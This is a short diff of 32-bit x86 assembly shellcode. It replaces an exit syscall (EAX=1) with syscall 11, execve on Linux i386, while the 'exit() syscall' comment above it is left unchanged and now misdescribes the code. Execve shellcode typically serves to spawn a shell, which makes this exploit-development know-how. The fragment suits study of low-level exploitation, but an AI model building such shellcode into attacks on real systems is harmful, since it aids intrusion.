@@ -48,9 +48,7 @@ shellcode:
         
       	; exit() syscall
 	xor eax, eax		              ; Set EAX to zero
-  	mov al, 0x1	                      ; Adding "1" to AL (= lower byte of EAX)
-  	xor ebx, ebx	                      ; Set EBX to zero
-  	mov bl, 0xa		              ; Adding "10" to BL (= lower byte of EBX)
+  	mov al, 0xb	                      ; Adding "11" to AL (= lower byte of EAX)
 	int 0x80
 
 
